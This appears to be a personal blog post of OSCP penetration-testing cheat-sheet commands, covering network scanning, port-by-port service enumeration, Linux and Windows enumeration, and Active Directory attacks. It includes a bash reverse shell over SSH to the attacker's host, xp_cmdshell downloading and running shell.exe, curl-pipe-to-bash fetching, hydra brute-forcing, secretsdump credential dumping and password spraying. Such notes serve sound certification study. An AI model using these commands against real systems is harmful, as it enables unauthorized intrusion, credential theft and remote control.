---
layout: post
title: OSCP Notes
date: 2023-06-01
categories: [Cheatsheet, OSCP, OffSec]
tags: [Cheatsheet, OSCP, OffSec]
---

# Network
### Network Enumeration
````bash
$ ping $IP # 63 ttl = linux # 127 ttl = windows

$ nmap -sn $IP/24 # enumerate subnet
$ nmap -p- --min-rate 1000 $IP -Pn # disables the ping command and only scans ports 
$ nmap -sU -p- --min-rate 1000 $IP -Pn
$ nmap -p <ports> -sV -sC -A $IP -oN nmap_servers
$ nmap -sU -p <ports> -sV -sC -A $IP -oN nmap_servers
$ nmap -sS -p- --min-rate=1000 $IP -Pn # stealth scans
$ ncat -nv --source-port 53 $IP <port> # Connect To a Filtered Port

# Scan network ranges
$ nmap $IP/24 -sn -oA filename | grep for | cut -d" " -f5

# Scan network ranges on a predefined ip list
$ nmap -sn -oA filename -iL hosts.lst | grep for | cut -d" " -f5 

# Scan by Using Decoys
$ nmap $IP -p- -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5

# SYN-Scan Filtered Ports From DNS Port
$ nmap $IP -p- -sS -Pn -n --disable-arp-ping --source-port 53
````

### FTP port 21
```bash
$ ftp -A $IP
$ ftp $IP

ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe

$ hydra -l user -P /usr/share/wfuzz/wordlist/others/common_pass.txt $IP -t 4 ftp
$ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ftp
$ wget -r ftp://steph:billabong@$IP/
$ wget -r ftp://anonymous:anonymous@$IP/
```

### SSH port 22
```bash
$ nc -nvlp 443
$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa user@$IP -t 'bash -i >& /dev/tcp/$OUR_IP/443 0>&1'

$ hydra -l user -P /usr/share/wfuzz/wordlist/others/common_pass.txt $IP -t 4 ssh
$ hydra -L users.txt -p password $IP -t 4 ssh -s 42022

$ chmod 600 id_rsa
$ ssh user@$IP -i id_rsa

$ ssh2john id_ecdsa > id_ecdsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash
```

### Telnet port 23
```bash
telnet -l user $IP
```

### SMTP port 25
```bash
$ nc -nv $IP 25
$ telnet $IP 25
> EHLO ALL
> VRFY <USER>
```

### DNS port 53
```bash
$ dnsrecon -d domain_name -n $IP -t axfr
```

### HTTP(S) port 80,443
```bash
$ whatweb -a 3 $IP
$ nikto -ask=no -h http://$IP 2>&1

$ dirb http://target.com

$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ

$ gobuster dir -u http://$IP:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
$ gobuster dir -u http://$IP:80/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html,htm

$ feroxbuster -u http://$IP -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
$ feroxbuster -u http://$IP:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 # if we dont want to see any denied
$ feroxbuster -u http://$IP:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 # if website redirects

$ curl http://$ip/api/
$ curl http://$ip/api/user/ 
```

### SMB port 139,445
```bash
$ smbmap -H $IP
$ smbmap -u "user" -p "pass" -H $IP
$ smbmap -H $IP -u null

$ enum4linux -a -M -l -d $IP 2>&1
$ enum4linux -a -u "" -p "" $IP && enum4linux -a -u "guest" -p "" $IP

$ crackmapexec smb $IP
$ crackmapexec smb $IP -u "" -p ""
$ crackmapexec smb $IP --shares -u "" -p ""
$ crackmapexec smb $IP -u 'guest' -p '' --users

$ smbclient -L \\$IP -U "" -N -p 12445
$ smbclient '//$IP/C' -p 12445
```

### SNMP port 161 UDP
```bash
$ sudo nmap --script snmp-* -sU -p161 $IP

$ snmpwalk -c public -v1 $IP
```

### LDAP port 389,636,3268,3269
```bash
$ ldapsearch -x -H ldap://$IP
...

$ ldapsearch -x -H ldap://$IP -s base namingcontexts
...
dn:
namingcontexts: DC=hutch,DC=offsec
namingcontexts: CN=Configuration,DC=hutch,DC=offsec
namingcontexts: CN=Schema,CN=Configuration,DC=hutch,DC=offsec
namingcontexts: DC=DomainDnsZones,DC=hutch,DC=offsec
namingcontexts: DC=ForestDnsZones,DC=hutch,DC=offsec
...

$ ldapsearch -x -H ldap://$IP -b "DC=hutch,DC=offsec"
```

### MSSQL port 1433
```bash
$ proxychains crackmapexec mssql -d domain_name -u sql_svc -p password -x "whoami" $IP
$ proxychains crackmapexec mssql -d domain_name -u sql_svc -p password -x "whoami" $IP -q 'SELECT name FROM master.dbo.sysdatabases;'

mssql> EXEC SP_CONFIGURE 'show advanced options', 1
mssql> EXEC SP_CONFIGURE 'xp_cmdshell' , 1
mssql> xp_cmdshell 'whoami'
mssql> xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://$OUR_IP:1337/shell.exe -OutFile c:\Users\Public\shell.exe"'
mssql> xp_cmdshell 'c:\Users\Public\shell.exe"'
```

### NFS port 2049
```bash
$ showmount $IP
$ showmount -e $IP

// sudo mount -o [options] -t nfs ip_address:share directory_to_mount
$ mkdir temp 
$ mount -t nfs -o vers=3 $IP:/home temp -o nolock
```

# Linux
### Linux Enumeration
```bash
# UPGRADE YOUR SHELL WHEN YOU GAIN ACCESS TO A SYSTEM!
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

$ uname -a
$ cat /etc/issue
$ cat /etc/*-release
$ sudo -l
$ ls -lsaht /etc/sudoers
$ groups <user>
$ env
$ find / -perm -u=s -type f 2>/dev/null
$ find / -perm -g=s -type f 2>/dev/null
$ netstat -antup
$ netstat -tunlp
```

# Windows
### Windows Enumeration
```powershell
PS C:\> systeminfo
PS C:\> hostname
PS C:\> whoami
PS C:\> net users # local users
PS C:\> net users /domain # all users on Domain
PS C:\> net localgroups
PS C:\> net user user1 # more info about user1
PS C:\> net group /domain # enumerate all groups on the domain
PS C:\> net group /domain "group1" # more info about group1
PS C:\> netsh firewall show state
PS C:\> netsh firewall show config
PS C:\> ipconfig /all # look for a dual victim machine, typically two $IPs shown
PS C:\> route print
PS C:\> arp -A # look for IPs that your victim is connected
```

### Credentials Hunting

```powershell
PS C:\> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
PS C:\> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
PS C:\> Get-ChildItem -Path C:\Users\user1\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
PS C:\> tree /f C:\Users\ # look for interesting files, backups etc.
```

## Active Directory

### Active Directory Enumeration

```bash
$ impacket-GetADUsers -dc-ip $DC_IP "domain.name/" -all 
$ impacket-GetADUsers -dc-ip $DC_IP domain.name/username:password -all
```

### Secrets Dumping

```bash
$ impacket-secretsdump Administrator:'password'@$IP -outputfile hashes
```

### AD Exploitation

```bash
$ crackmapexec smb $IP -u users.txt -p 'password' -d domain.name --continue-on-success
$ crackmapexec smb $IP -u user -p 'password' -d domain.name
$ crackmapexec smb $IP -u users.txt -p pass.txt -d domain.name --continue-on-success
$ proxychains crackmapexec smb $IP -u Administrator -p password -x whoami --local-auth
$ proxychains crackmapexec winrm $IP -u Administrator -p password -x whoami --local-auth
$ crackmapexec winrm $IP -u users.txt -p 'password' -d domain.name --continue-on-success
$ crackmapexec winrm $IP -u user -p 'password' -d domain.name
$ crackmapexec winrm $IP -u users.txt -p pass.txt -d domain.name --continue-on-succes
$ proxychains crackmapexec mssql -d domain.name -u user -p password -x "whoami" $IP
```

# Other Helpful Commands

##### virtualenv

```bash
# sudo apt-get install virtualenv
$ virtualenv myenv # create virutal environment
$ source myenv/bin/activate # activate the virutal environment
$ deactivate # deactivate the virutal environment
```

##### grep

```bash
# search for the files that contains the phrase password in it
$ grep -ir password
$ grep -iRl "password" ./

# exclude multiple strings
$ grep -Ev 'exclude1 | exclude2' filename.txt

# obtain only lines starting with small letters
$ grep -v '[A-Z]' users.txt
```

##### curl

```bash
# upload files via curl
$ curl --user "{user}:{creds}" --upload-file=<file> "http://$IP/upload_location"

# curl save the output
$ curl http://$IP -o index.html

# pipe the requesting files
$ curl http://$IP:$PORT:lin(peas\|enum).sh | bash

# proxy request
$ curl --proxy http://127.0.0.1:8080

# 
$ curl --path-as-is http://<RHOST>/../../../../../../etc/passwd
```

##### wget

```bash
# download files with wget
$ wget http://$IP/xxx.sh

# run files without downloading
$ wget -O - http://$IP:<port_no>:lin(peas\|enum).sh

# download file and save it somewhere (tmp)
$ wget -O /tmp/shell.elf $IP/shell.elf
```

##### sed

```bash
# search and replace strings
$ cat username.txt | sed s/{stringToBeChanged}/{replacementString}/g
```

##### find

```bash
# find with file names
$ find . -name user.txt 

# find and execute
$ find . -name '*.txt' -exec cat "{}" \;

# find files with specific string in it
$ find . -type f -print0 | xargs -0 -e grep -niH -e "string"

# find certain file and exclude files from /proc/ and /sys/ directories
$ find / -name Settings.* 2>/dev/null | grep -v '/proc/' | grep -v '/sys/'
```

##### Decompressing

```bash
# unzip a zip file
$ unzip file.zip

# extract a .tar file
$ tar -xvf file.tar 

# unzip a *.tar.gz file
$ tar -xzvf file.tar.gz
```

##### watch

```bash
# monitor, repeat the same command for a period of time
# ls -la every 1 sec on a dir
$ watch -n 1 'ls -la'

# repeat executing the command
$ watch <command>
 
# execute the commands in specific intervals
$ watch -n <seconds> <command>

# highlight the differences in each execution ## Thanks copycookie.com 
$ watch -n <seconds> -d <command> 

# exit on changes
$ watch -g <command>
```

##### locate

```bash
# List various available nmap scripts
$ locate scripts/citrix
```

##### loops

```bash
# for loop that adds payload += in each line of the file
$ for i in $(cat hexdata); do echo "payload += b'$i'"; done
```

##### tail

```bash
# view only last line of the file
$ tail -1 <file>

# view last 7 lines from the file
$ tail -n7 <file>
```

##### vim

```bash
x # cut character
dw # cut word
dd # cut full line
yw # copy word
yy # copy full line
p # paste
:1 # go to line number 1
:q! # quit without saving
```

##### Connecting to target

```bash
# Connect to a Windows target using the Remote Desktop Protocol.
$ xfreerdp /v:IP /u:username /p:password +clipboard

# Uses Evil-WinRM to establish a Powershell session with a target.
$ evil-winrm -i IP -u username -p password
or
$ evil-winrm -i IP -u username -H "<passwordhash>"

# Uses SSH to connect to a target using a specified user.
$ ssh user@IP

# Uses smbclient to connect to an SMB share using a specified user.
$ smbclient -U username \\\\IP\\SHARENAME

# Create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host.
$ python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/
```
